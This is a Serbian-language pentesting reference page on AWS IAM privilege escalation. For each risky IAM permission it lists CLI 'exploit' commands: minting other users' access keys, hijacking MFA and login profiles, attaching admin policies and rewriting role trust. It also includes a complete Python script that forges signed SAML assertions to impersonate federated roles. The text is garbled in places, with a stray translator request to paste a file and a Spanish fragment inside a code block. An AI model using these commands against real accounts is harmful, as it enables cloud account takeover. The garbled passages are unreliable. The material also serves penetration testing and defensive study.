# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Za više informacija o IAM pogledajte:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Omogućava stvaranje nove verzije IAM policy-ja, zaobilazeći potrebu za dozvolom `iam:SetDefaultPolicyVersion` korišćenjem zastavice `--set-as-default`. Ovo omogućava definisanje prilagođenih dozvola.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Impact:** Direktno eskalira privilegije omogućavajući izvršenje bilo koje akcije nad bilo kojim resursom.

### **`iam:SetDefaultPolicyVersion`**

Omogućava promenu podrazumevane verzije IAM policy-ja na drugu postojeću verziju, što može potencijalno eskalirati privilegije ako nova verzija ima više dozvola.

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Uticaj:** Neizravna eskalacija privilegija omogućavanjem dodatnih dozvola.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Omogućava kreiranje access key ID i secret access key za drugog korisnika, što može dovesti do potencijalne eskalacije privilegija.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact:** Direktno eskaliranje privilegija preuzimanjem proširenih dozvola drugog korisnika.

Imajte na umu da korisnik može imati kreirane samo 2 access keys, tako da ako korisnik već ima 2 access keys, biće vam potrebna dozvola `iam:DeleteAccessKey` da obrišete jedan od njih kako biste mogli kreirati novi:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Ako možete da kreirate novi virtuelni MFA uređaj i omogućite ga na drugom korisniku, možete efektivno da registrujete sopstveni MFA za tog korisnika i zatim zatražite sesiju podržanu MFA-om za njihove podatke za prijavu.

**Eksploatacija:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Uticaj:** Direct privilege escalation by taking over a user's MFA enrollment (and then using their permissions).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Dozvoljava kreiranje ili ažuriranje login profila, uključujući postavljanje lozinki za AWS console login, što vodi do direct privilege escalation.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Eksploit za ažuriranje:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Uticaj:** Direktna eskalacija privilegija prijavom kao "bilo koji" korisnik.

### **`iam:UpdateAccessKey`**

Omogućava ponovo omogućavanje onemogućenog access key-a, što može dovesti do neovlašćenog pristupa ako napadač poseduje onemogućeni access key.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Impact:** Direktna eskalacija privilegija ponovnim reaktiviranjem access keys.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Omogućava generisanje ili resetovanje kredencijala za specifične AWS servise (najčešće **CodeCommit**). Ovo nisu **AWS API keys**: to su kredencijali u obliku **korisničko ime/lozinka** za određeni servis, i možete ih koristiti samo tamo gde taj servis prihvata te kredencijale.

**Kreiranje:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Sačuvaj:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Primer:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Napomena: Lozinka servisa često sadrži karaktere kao što su `+`, `/` i `=`. Najlakše je obično koristiti interaktivni prompt. Ako je ubacite u URL, prvo je URL-encode-ujte.

U ovom trenutku možete pročitati sve čemu ciljani korisnik ima pristup u CodeCommit (npr. a leaked credentials file). Ako iz repozitorijuma preuzmete **AWS access keys**, konfigurišite novi **AWS CLI profile** sa tim ključevima i zatim pristupite resursima (na primer, pročitajte flag iz Secrets Manager):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Poništi:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Uticaj:** Privilege escalation u privilegije ciljanog korisnika za dati servis (i potencijalno dalje ako pivotujete koristeći podatke dobijene iz tog servisa).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Omogućava pridruživanje politika korisnicima ili grupama, direktno eskalirajući privilegije nasleđivanjem dozvola iz priložene politike.

**Eksploit za korisnika:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit za grupu:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Uticaj:** Direktna eskalacija privilegija do svega što ta politika dodeljuje.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Dozvoljava pridruživanje ili postavljanje politika na role, korisnike ili grupe, omogućavajući direktnu eskalaciju privilegija dodeljivanjem dodatnih dozvola.

**Eksploatacija za ulogu:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit za Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Molim vas nalepite sadržaj fajla src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/README.md koji želite da prevedem. Prevešću tekst na srpski uz ta pravila koja ste naveli (ne prevodim kod, nazive tehnika, cloud/SaaS imena, linkove, putanje i markdown/html tagove).
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Uticaj:** Direktna eskalacija privilegija dodavanjem dozvola putem politika.

### **`iam:AddUserToGroup`**

Omogućava dodavanje sebe u IAM grupu, eskalirajući privilegije nasleđivanjem dozvola grupe.

**Eksploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Uticaj:** Direktna eskalacija privilegija do nivoa dozvola grupe.

### **`iam:UpdateAssumeRolePolicy`**

Dozvoljava izmenu assume role policy dokumenta role, omogućavajući preuzimanje role i pristup njenim pripadajućim dozvolama.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Kada politika izgleda ovako, korisniku se daje dozvola da preuzme ulogu:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Uticaj:** Direct privilege escalation by assuming any role's permissions.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Dozvoljava otpremanje SSH javnog ključa za autentifikaciju u CodeCommit i deaktiviranje MFA uređaja, što može dovesti do potencijalnog indirektnog privilege escalation.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit za deaktivaciju MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Uticaj:** Indirektna eskalacija privilegija omogućavanjem pristupa CodeCommit ili onemogućavanjem MFA zaštite.

### **`iam:ResyncMFADevice`**

Omogućava resinkronizaciju MFA uređaja, što potencijalno može dovesti do indirektne eskalacije privilegija manipulacijom MFA zaštite.

**Bash Command:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Indirektna eskalacija privilegija dodavanjem ili manipulacijom MFA uređaja.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Sa ovim dozvolama možete **change the XML metadata of the SAML connection**. Nakon toga, možete zloupotrebiti **SAML federation** da se **login** sa bilo kojim **role that is trusting** it.

Obratite pažnju da radeći ovo **legit users won't be able to login**. Međutim, možete dobiti XML, zameniti ga svojim, login-ovati se i vratiti prethodnu konfiguraciju.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**End-to-end napad:**

1. Enumerišite SAML provider i rolu koja mu veruje:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. Forge IdP metadata + potpisanu SAML assertion za role/provider par:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Proširivo: <code>/tmp/saml_forge.py</code> pomoćna skripta (metapodaci + potpisana tvrdnja)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. Ažurirajte SAML provider metadata koristeći vaš IdP sertifikat, preuzmite ulogu i koristite vraćene STS kredencijale:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Čišćenje: vratiti prethodne metapodatke:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> Ažuriranje metapodataka SAML provajdera je disruptivno: dok su vaši metapodaci na snazi, legitimni SSO korisnici možda neće moći da se autentifikuju.

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Nisam siguran u ovo) Ako napadač ima ove **dozvole**, mogao bi dodati novi **Thumbprint** i tako se prijaviti u sve uloge koje veruju provajderu.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Ovo dopuštenje omogućava napadaču da ažurira permissions boundary korisnika, što može dovesti do eskalacije njihovih privilegija time što će im omogućiti da izvršavaju radnje koje su inače ograničene njihovim postojećim dozvolama.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Akter sa iam:PutRolePermissionsBoundary može postaviti permissions boundary na postojeću role. Rizik nastaje kada neko sa ovom dozvolom promeni role’s boundary: može nepravilno ograničiti operacije (izazivajući prekid usluge) ili, ako postavi permissive boundary, efikasno proširiti šta role može da radi i povećati privilegije.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Izvori

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
